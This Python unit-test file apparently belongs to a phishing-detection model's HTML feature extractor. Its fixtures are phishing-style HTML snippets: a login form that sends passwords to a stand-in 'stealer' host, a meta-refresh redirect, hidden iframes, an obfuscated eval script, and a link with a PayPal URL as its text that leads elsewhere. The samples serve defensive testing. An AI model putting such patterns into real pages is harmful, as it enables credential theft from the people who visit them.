"""Unit tests for HTML feature extraction logic, parser robustness, and edge cases."""

from ml.feature_extraction.html_feature_config import FEATURE_NAMES as HTML_FEATURE_NAMES
from ml.feature_extraction.html_features import extract_html_features


def test_html_feature_names_completeness():
    """Ensure all extracted HTML features match exactly with HTML_FEATURE_NAMES."""
    html = "<html><head><title>Test</title></head><body><p>Hello World</p></body></html>"
    features = extract_html_features(html, page_url="https://example.com")

    assert set(features.keys()) == set(HTML_FEATURE_NAMES)
    assert len(features) == len(HTML_FEATURE_NAMES)
    for name in HTML_FEATURE_NAMES:
        assert name in features


def test_valid_html_with_login_form():
    """Verify detection of login forms, password inputs, and input counts."""
    html = """
    <!DOCTYPE html>
    <html>
    <head><title>Sign In to Account</title></head>
    <body>
        <form action="/login" method="POST">
            <input type="text" name="username" placeholder="Username" />
            <input type="password" name="password" placeholder="Password" />
            <input type="submit" value="Sign In" />
        </form>
    </body>
    </html>
    """
    features = extract_html_features(html, page_url="https://example.com/login")

    assert features["num_forms"] == 1
    assert features["num_input_fields"] == 3
    assert features["num_password_fields"] == 1
    assert features["has_login_form"] is True
    assert features["num_forms_with_external_action"] == 0
    assert features["has_form_action_empty_or_javascript"] is False
    assert features["title_length"] == len("Sign In to Account")
    assert features["parse_error"] is False


def test_external_form_action():
    """Verify detection of forms whose action submits to an external domain."""
    html = """
    <html>
    <body>
        <form action="https://attacker-stealer-server.xyz/harvest.php" method="POST">
            <input type="text" name="email" />
            <input type="password" name="pass" />
        </form>
    </body>
    </html>
    """
    features = extract_html_features(html, page_url="https://legitimate-bank.com/portal")

    assert features["has_login_form"] is True
    assert features["num_forms_with_external_action"] == 1


def test_empty_and_javascript_form_action():
    """Verify empty, #, or javascript: form action detection."""
    html = """
    <html>
    <body>
        <form action="javascript:void(0);">
            <input type="text" name="pin" />
        </form>
    </body>
    </html>
    """
    features = extract_html_features(html, page_url="https://example.com")

    assert features["has_form_action_empty_or_javascript"] is True


def test_hidden_iframe_detection():
    """Verify detection of 0-sized and CSS-hidden iframes."""
    html_width0 = '<html><body><iframe src="http://hidden.xyz" width="0" height="0"></iframe></body></html>'
    features1 = extract_html_features(html_width0)
    assert features1["num_iframes"] == 1
    assert features1["has_hidden_iframe"] is True

    html_styled = '<html><body><iframe src="http://hidden.xyz" style="display:none; visibility:hidden;"></iframe></body></html>'
    features2 = extract_html_features(html_styled)
    assert features2["has_hidden_iframe"] is True

    html_normal = '<html><body><iframe src="http://normal.xyz" width="600" height="400"></iframe></body></html>'
    features3 = extract_html_features(html_normal)
    assert features3["num_iframes"] == 1
    assert features3["has_hidden_iframe"] is False


def test_meta_refresh_redirect():
    """Verify detection of meta http-equiv refresh tags."""
    html = """
    <html>
    <head>
        <meta http-equiv="refresh" content="0; url=https://phishing-redirect.xyz/login" />
    </head>
    <body>Redirecting...</body>
    </html>
    """
    features = extract_html_features(html)

    assert features["num_meta_refresh_redirects"] == 1


def test_suspicious_inline_js_patterns():
    """Verify heuristic detection of eval, document.write, and location redirects in scripts."""
    html = """
    <html>
    <head>
        <script>
            var _0x123 = eval(unescape('%68%65%6c%6c%6f'));
            window.location.href = "http://phish.xyz";
        </script>
    </head>
    <body></body>
    </html>
    """
    features = extract_html_features(html)

    assert features["num_scripts"] == 1
    assert features["has_suspicious_js_patterns"] is True


def test_link_counting_and_mismatched_text():
    """Verify internal vs external link classification and anchor text deception."""
    html = """
    <html>
    <body>
        <a href="/about">About Us</a>
        <a href="https://example.com/contact">Contact</a>
        <a href="https://external-site.org/info">Partner</a>
        <a href="http://evil-phish.xyz/login">https://paypal.com/security</a>
    </body>
    </html>
    """
    features = extract_html_features(html, page_url="https://example.com/home")

    assert features["num_links"] == 4
    assert features["num_internal_links"] == 2
    assert features["num_external_links"] == 2
    assert features["external_link_ratio"] == 0.5
    assert features["num_links_with_mismatched_text"] == 1


def test_benign_clean_page_no_false_positives():
    """Verify clean, simple HTML produces 0 / False on security flags."""
    html = """
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <title>Benign Company Blog</title>
        <link rel="shortcut icon" href="/favicon.ico" />
    </head>
    <body>
        <h1>Welcome to our engineering blog</h1>
        <p>This is a standard text paragraph with no authentication forms.</p>
        <img src="/logo.png" alt="Company Logo" />
        <a href="/archive">Read older posts</a>
    </body>
    </html>
    """
    features = extract_html_features(html, page_url="https://company.org/blog")

    assert features["num_forms"] == 0
    assert features["has_login_form"] is False
    assert features["num_password_fields"] == 0
    assert features["has_form_action_empty_or_javascript"] is False
    assert features["num_forms_with_external_action"] == 0
    assert features["has_hidden_iframe"] is False
    assert features["has_suspicious_js_patterns"] is False
    assert features["num_meta_refresh_redirects"] == 0
    assert features["has_favicon"] is True
    assert features["num_images"] == 1
    assert features["title_length"] == len("Benign Company Blog")
    assert features["parse_error"] is False


def test_empty_string_input():
    """Verify empty or whitespace string input gracefully returns parse_error=True."""
    features = extract_html_features("")
    assert features["parse_error"] is True
    assert features["num_forms"] == 0
    assert features["text_to_html_ratio"] == 0.0

    features_ws = extract_html_features("    \n\t  ")
    assert features_ws["parse_error"] is True


def test_garbage_non_html_input():
    """Verify non-HTML / binary / malformed garbage input returns parse_error=True without crashing."""
    garbage = "PK\x03\x04\x14\x00\x00\x00\x08\x00\x00\x00\x00\x00!@#$%^&*()_+~`{}|:<>?"
    features = extract_html_features(garbage)

    assert isinstance(features, dict)
    assert features["parse_error"] is True
    assert set(features.keys()) == set(HTML_FEATURE_NAMES)
